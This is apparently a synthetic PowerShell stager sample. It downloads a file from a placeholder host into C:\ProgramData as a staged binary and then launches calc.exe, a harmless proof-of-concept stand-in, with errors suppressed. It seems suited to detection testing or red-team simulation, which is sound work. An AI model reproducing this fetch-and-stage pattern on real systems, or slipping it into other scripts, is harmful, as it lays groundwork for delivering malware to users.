
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://internal.corp:80/update.dat",
    [string]$Stage2Path = "C:\ProgramData\stage1.bin"
)
try { (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $Stage2Path); Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Write-Verbose "stage marker 26 reached" } catch { Write-Warning "Remote fetch failed" }
